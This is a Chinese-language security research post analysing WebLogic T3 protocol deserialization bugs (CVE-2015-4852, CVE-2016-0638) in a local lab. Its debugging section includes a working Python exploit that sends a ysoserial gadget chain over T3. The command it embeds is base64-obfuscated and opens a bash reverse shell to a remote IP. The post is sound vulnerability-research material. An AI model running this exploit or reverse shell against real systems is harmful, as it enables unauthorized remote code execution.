---
title: Weblogic 关于T3协议和二次反序列化分析
url: https://buaq.net/go-157756.html
source: unSafe.sh - 不安全
date: 2023-04-10
fetch_date: 2025-10-04T11:29:31.806214
---

# Weblogic 关于T3协议和二次反序列化分析

* [unSafe.sh - 不安全](https://unsafe.sh)
* [我的收藏](/user/collects)
* [今日热榜](/?hot=true)
* [公众号文章](/?gzh=true)
* [导航](/nav/index)
* [Github CVE](/cve)
* [Github Tools](/tools)
* [编码/解码](/encode)
* [文件传输](/share/index)
* [Twitter Bot](https://twitter.com/buaqbot)
* [Telegram Bot](https://t.me/aqinfo)
* [Search](/search/search)

[Rss](/rss.xml)

[ ]
黑夜模式

![](https://8aqnet.cdn.bcebos.com/e74ca487b4f2b206f7ea3b0b3f1de215.jpg)

Weblogic 关于T3协议和二次反序列化分析

环境搭建使用https://github.com/QAX-A-Team/WeblogicEnvironmentQAX的自动化搭建参考：https://www.cn
*2023-4-9 09:31:0
Author: [xz.aliyun.com(查看原文)](/jump-157756.htm)
阅读量:29
收藏*

---

## 环境搭建

使用<https://github.com/QAX-A-Team/WeblogicEnvironment>QAX的自动化搭建

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194702-13b51004-d603-1.png)

然后就是修改Dockerfile，因为libnsl这个东西 会安装错误

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194709-1819867a-d603-1.png)

`vim Dockerfile`
把`RUN yum -y install libnsl`删除即可 （就只搭建环境浪费了我两天时间）

```
docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .
docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21F
```

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194718-1d2a86e6-d603-1.png)

（垃圾），到之后从kali中提出文件的时候 会拖不到本地来......
（最后还是 windows本地搭建的，在docker中走代理）

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194725-21ad8fb0-d603-1.png)

### 远程调试

```
mkdir ./middleware
mkdir -p ./coherence_3.7/lib
docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./middleware/
docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver ./middleware/
docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./coherence_3.7/lib
```

直接拉到本地

> 如果不想这么麻烦的话可以直接运行对于的.sh脚本，比如这里安装的是1036 jdk是7u21 ，直接运行run\_weblogicjdk7u21.sh，自动安装以及自动从容器里面导出jar包。

新建一个web项目 然后
打开wlserver目录

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194736-282d2ca6-d603-1.png)

然后add library刚刚导出的`coherence_3.7/lib`和`modules`
配置远程调试

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194742-2bcb3e48-d603-1.png)

点击debug

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194751-30cef24a-d603-1.png)

如此便是可以debug了
（搭环境搭了三天了...........） 开团！！！

### 验证环境

`weblogic/wsee/jaxws/WLSServletAdapter.class`的handle方法打上断点(如果查不到使用全局搜索即可)
访问`http://127.0.0.1:7001/wls-wsat/CoordinatorPortType`

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194758-352f2224-d603-1.png)

## 关于T3协议

T3协议是Weblogic用于通信的独有的一个协议，Weblogic Server的RMI通信使用它在其他区的Java程序(包括 服务端，客户端，以及其他实例)传输数据。

### T3协议的组成

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194809-3be04c06-d603-1.png)

这里借一张图解释一下关于 T3协议的组成

> `ac ed 00 05`是反序列化标志，而在 T3 协议中每个序列化数据包前面都有`fe 01 00 00`，所以 T3 的序列化标志为`fe 01 00 00 ac ed 00 05`

并且在发送T3协议的时候 还可以发送多个序列化数据 ，可以替换其中一个的序列化数据 实现反序列化攻击。
借qax的一张图解释

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194816-3fc4791e-d603-1.png)

## 基于T3协议的漏洞

关于T3协议 最开始的漏洞是CVE-2015-4852，随后都是绕过官方的补丁例如：CVE-2016-0638、CVE-2016-3510、CVE-2018-2628、CVE-2020-2555、CVE-2020-2883

### CVE-2015-4852

在weblogic收到T3协议的时候
会在`weblogic/rjvm/InboundMsgAbbrev.class`类中进行反序列化操作的处理

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194835-4b45e084-d603-1.png)

这里重写了readObject
调用了`ServerChannelInputStream`

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194843-504f1474-d603-1.png)

在`ServerChannelInputStream`中 重写了`resolveClass`但是其最终还是调用了父类的`resolveClass`

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194852-55261574-d603-1.png)

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194856-580cc06c-d603-1.png)

简单点说就是 ，resolveClass方法把类的序列化描述加工成该类的Class对象，所以这里也就是入口点
没有任何过滤的调用resolveClass ，可以加载恶意的Class对象
这里放入resolveClass的源码

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194906-5d94324a-d603-1.png)

### debug分析

POC：

```
from os import popen
import struct  # 负责大小端的转换
import subprocess
from sys import stdout
import socket
import re
import binascii

def generatePayload(gadget, cmd):
    YSO_PATH = "./ysoserial-all.jar"
    popen = subprocess.Popen(['java', '-jar', YSO_PATH, gadget, cmd], stdout=subprocess.PIPE)
    return popen.stdout.read()

def T3Exploit(ip, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip, port))
    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"
    sock.sendall(handshake.encode())
    data = sock.recv(1024)
    data += sock.recv(1024)
    compile = re.compile("HELO:(.*).0.false")
    print(data.decode())
    match = compile.findall(data.decode())
    if match:
        print("Weblogic: " + "".join(match))
    else:
        print("Not Weblogic")
        return
    header = binascii.a2b_hex(b"00000000")
    t3header = binascii.a2b_hex(
        b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006")
    desflag = binascii.a2b_hex(b"fe010000")
    payload = header + t3header + desflag + payload
    payload = struct.pack(">I", len(payload)) + payload[4:]
    sock.send(payload)

if __name__ == "__main__":
    ip = "127.0.0.1"
    port = 7001
    gadget = "CommonsCollections1"
    cmd = "bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTkyLjE2OC4yLjE0OS84MDAwIDwmMSc=}|{base64,-d}|{bash,-i}"
    payload = generatePayload(gadget, cmd)
    T3Exploit(ip, port, payload)
```

var1是我们输入的序列化数据

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194919-65aebc52-d603-1.png)

中间的一系列调用省略 直接到resolveClass类中

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194924-6858c57e-d603-1.png)

这里的var1是AnnotationInvocationHandler，就直接到了cc1的起点

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194930-6be9aac8-d603-1.png)

调用getName方法获取类名，之后通过Class.forName方法获取对应的类，因为这里的resolveClass方法是直接使用的父类的该方法，并没有做出任何的安全过滤操作，所以能够实例化任意类
之后的利用T3协议反序列化的都是和黑名单、白名单斗智斗勇的

### CVE-2016-0638

这个cve即是绕过2015补丁的也是一个二次反序列化的实例

关于Externalizable

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194940-71f96bf6-d603-1.png)

`weblogic/jms/common/StreamMessageImpl`

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194947-7666e9a2-d603-1.png)

可以看到调用了一次readExternal，又调用了一次readObject两次反序列化
这里我们跟进`createPayload`方法

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408194955-7abc7936-d603-1.png)

readInt()读取 输入数据的长度，var0为输入数据

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408195001-7ec76a72-d603-1.png)

`Math.min(var1, Chunk.CHUNK_SIZE * 2)`取出chunk长度中较小的一位

![](https://xzfile.aliyuncs.com/media/upload/picture/20230408195009-8353bec4-d603-1.png)

将我们的读取到的chunk进行反序列化，重写writeExternal()方法，将需要二次反序列化的数据写入，再次进行序列化即可。ref：<https://www.anquanke.com/post/id/250801#h3-8>

## ref

[https://www.cnblogs.com/nice0e3/p/14201884.html](https://www.cnblogs.com/nice0e3/p/14201884.html#0x00-%E5%89%8D%E8%A8%80)
<https://xz.aliyun.com/t/11078>
<https://www.freebuf.com/vuls/351801.html>

文章来源: https://xz.aliyun.com/t/12397
 如有侵权请联系:admin#unsafe.sh

© [unSafe.sh - 不安全](https://unsafe.sh) Powered By [PaperCache](https://github.com/code-scan/PaperCache)

* admin#unsafe.sh
* [安全马克](https://aq.mk)
* [星际黑客](https://xj.hk)
* [T00ls](https://t00ls.net)